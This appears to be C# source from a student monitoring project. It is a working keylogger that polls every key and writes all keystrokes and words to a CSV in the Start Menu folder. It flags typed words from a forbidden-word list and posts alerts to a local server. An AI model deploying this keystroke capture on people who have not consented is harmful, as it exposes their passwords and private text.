using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace FYP
{
    internal class Tracking2
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public class KeyLog
        {
            public string TimeStamp { get; set; }
            public string Key { get; set; }
            public string Word { get; set; }
        }

        public static KeyLog LatestKeyLog { get; private set; }

        private static StringBuilder currentWord = new StringBuilder();
        private static HashSet<string> forbiddenWords;
        private static List<KeyValuePair<string, DateTime>> detectedWords = new List<KeyValuePair<string, DateTime>>();

        private static readonly HttpClient httpClient = new HttpClient { BaseAddress = new Uri("http://localhost:8080") };

        private static void LoadForbiddenWords(string csvPath)
        {
            forbiddenWords = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                using (var reader = new StreamReader(csvPath, Encoding.UTF8))
                {
                    while (!reader.EndOfStream)
                    {
                        var line = reader.ReadLine();
                        if (!string.IsNullOrWhiteSpace(line))
                        {
                            forbiddenWords.Add(line.Trim().ToLower());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error loading forbidden words from CSV: {ex.Message}");
            }
        }

        private static string GetKeyText(int key)
        {
            string keyText = Enum.GetName(typeof(ConsoleKey), key);

            if (keyText == null)
            {
                switch (key)
                {
                    case 1: keyText = "Left mouse button"; break;
                    case 2: keyText = "Right mouse button"; break;
                    case 4: keyText = "Middle mouse button"; break;
                    case 11: keyText = "CTRL key"; break;
                    case 12: keyText = "ALT key"; break;
                    case 14: keyText = "CAPS LOCK key"; break;
                    case 16: keyText = "SHIFT key"; break;
                    case 144: keyText = "NUM LOCK key"; break;
                    case 145: keyText = "SCROLL LOCK key"; break;
                    case 160: keyText = "Left SHIFT key"; break;
                    case 161: keyText = "Right SHIFT key"; break;
                    case 162: keyText = "Left CONTROL key"; break;
                    case 163: keyText = "Right CONTROL key"; break;
                    case 164: keyText = "Left ALT key"; break;
                    case 165: keyText = "Right ALT key"; break;
                    case 0x08: keyText = "Backspace"; break;
                    default: keyText = $"0x{key:X}"; break;
                }
            }
            else if (Enum.IsDefined(typeof(ConsoleKey), key))
            {
                string keyName = Enum.GetName(typeof(ConsoleKey), key);
                if (keyName.StartsWith("D") && keyName.Length == 2)
                {
                    return keyName.Substring(1);
                }
                return keyName;
            }
            else
            {
                keyText = $"{keyText}";
            }

            return keyText;
        }

        private static string ProcessKeyForWord(string keyText)
        {
            string completedWord = null;
            if (keyText == "Spacebar" || keyText == "Enter" || keyText == "Left mouse button" || keyText == "Tab")
            {
                if (currentWord.Length > 0)
                {
                    completedWord = currentWord.ToString().ToLower();
                    currentWord.Clear();
                }
            }
            else if (keyText == "Backspace")
            {
                if (currentWord.Length > 0)
                {
                    currentWord.Length--;
                }
            }
            else
            {
                currentWord.Append(keyText);
            }
            return completedWord;
        }

        private static async Task CheckForForbiddenWords(string completedWord)
        {
            if (string.IsNullOrWhiteSpace(completedWord))
                return;

            if (forbiddenWords.Contains(completedWord))
            {
                DateTime now = DateTime.Now;
                detectedWords.Add(new KeyValuePair<string, DateTime>(completedWord, now));

                // Remove timestamps older than 2 minutes
                detectedWords = detectedWords.Where(pair => (now - pair.Value).TotalMinutes <= 2).ToList();

                // Count occurrences of each forbidden word
                var wordCount = detectedWords.GroupBy(pair => pair.Key)
                                             .ToDictionary(g => g.Key, g => g.Count());

                // Count the total number of forbidden words typed in the last 2 minutes
                int totalForbiddenWordsCount = detectedWords.Count;

                // Check if either condition is met
                bool isAnomaly = wordCount.Any(word => word.Value >= 2) || totalForbiddenWordsCount >= 3;

                if (isAnomaly)
                {
                    string deviceName = GetDeviceName();
                    string message;

                    // Check if a specific word was typed 3 times
                    var specificWord = wordCount.FirstOrDefault(word => word.Value >= 3);
                    if (specificWord.Key != null)
                    {
                        message = $"Alert: Suspicious activity on {deviceName}: {specificWord.Key} has been typed {specificWord.Value} times.";
                    }
                    else
                    {
                        message = $"Alert: Suspicious activity on {deviceName}: {totalForbiddenWordsCount} forbidden words have been typed in the last 2 minutes.";
                    }

                    Console.WriteLine(message);

                    // Construct the JSON payload
                    var payload = new
                    {
                        source = "forbiddenword",
                        type = "keyboardBehavior",
                        message = message
                    };

                    // Serialize payload to JSON
                    var jsonPayload = JsonSerializer.Serialize(payload);

                    // Send the JSON payload to the server
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    using (var httpClient = new HttpClient())
                    {
                        var response = await httpClient.PostAsync("http://localhost:8080/api/data", content);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("Data successfully sent to Node.js server.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to send data to Node.js server: {response.StatusCode} - {response.ReasonPhrase}");
                        }
                    }
                }
            }
        }


        private static string GetDeviceName()
        {
            return Environment.MachineName;
        }

        public static void TrackKeyboard()
        {
            string username = Environment.UserName;
            string logPath = $"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Log";
            Directory.CreateDirectory(logPath);
            string path = Path.Combine(logPath, "Keylogger.csv");
            string forbiddenWordsPath = "C:\\Users\\huzai\\source\\repos\\test1\\forbiddenwords.csv"; // Path to your forbidden words CSV file
            LoadForbiddenWords(forbiddenWordsPath);

            using (StreamWriter writer = new StreamWriter(path, true))
            {
                FileInfo fileInfo = new FileInfo(path);
                if (fileInfo.Length == 0)
                {
                    writer.WriteLine("Time,Key,Word");
                }

                while (true)
                {
                    for (int i = 0; i < 256; i++)
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                        {
                            string timeStamp = DateTime.Now.ToString("HH:mm:ss");
                            string keyText = GetKeyText(i);

                            string completedWord = ProcessKeyForWord(keyText);

                            if (completedWord != null)
                            {
                                CheckForForbiddenWords(completedWord);
                                Console.WriteLine($"Captured Word: {completedWord}");
                                writer.WriteLine($"{timeStamp},{keyText},{completedWord}");
                            }
                            else
                            {
                                writer.WriteLine($"{timeStamp},{keyText},");
                            }
                            writer.Flush();

                            LatestKeyLog = new KeyLog { TimeStamp = timeStamp, Key = keyText, Word = completedWord };

                            /*if (completedWord != null)
                            {
                                Console.WriteLine($"Latest Key: {LatestKeyLog.Key}, Time: {LatestKeyLog.TimeStamp}, Word: {completedWord}");
                            }
                            else
                            {
                                Console.WriteLine($"Latest Key: {LatestKeyLog.Key}, Time: {LatestKeyLog.TimeStamp}");
                            }*/

                            //Task.Run(() => CheckForAnomalies(LatestKeyLog));
                        }
                    }

                    Thread.Sleep(10);
                }
            }
        }

        private static async void CheckForAnomalies(KeyLog entry)
        {
            string pythonPath = "C:\\Users\\huzai\\AppData\\Local\\Programs\\Python\\Python311\\python.exe";
            string scriptPath = "C:\\Users\\huzai\\source\\repos\\test1\\keyboardanamoly.py";

            if (!File.Exists(scriptPath))
            {
                Console.WriteLine($"Python script not found: {scriptPath}");
                return;
            }
             
            ProcessStartInfo start = new ProcessStartInfo
            {
                FileName = pythonPath,
                Arguments = string.Format("{0} {1} \"{2}\"", scriptPath, entry.TimeStamp, entry.Key),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            try
            {
                using (Process process = Process.Start(start))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd().Trim();
                        Console.WriteLine($"Python script output: {result}");

                        bool isAnomalous;
                        if (bool.TryParse(result, out isAnomalous))
                        {
                            if (isAnomalous)
                            {
                                Console.WriteLine("Anomaly detected in keyboard data!");
                            }
                        }
                        else
                        {
                            Console.WriteLine("Invalid output from Python script.");
                            // Handle unexpected output if needed
                        }

                        var messageContent = result.Replace("\r", "").Replace("\n", "");
                        var content = new StringContent($"{{ \"source\": \"keyboard\", \"message\": \"{messageContent}\" }}", Encoding.UTF8, "application/json"); 
                        var response = await httpClient.PostAsync("http://localhost:8080/api/data", content); 
                                                                                                            

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("Data successfully sent to Node.js server.");
                        }
                        else
                        {
                            Console.WriteLine($"Failed to send data to Node.js server: {response.StatusCode} - {response.ReasonPhrase}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing Python script: {ex.Message}");
            }

        }
    }
    
}
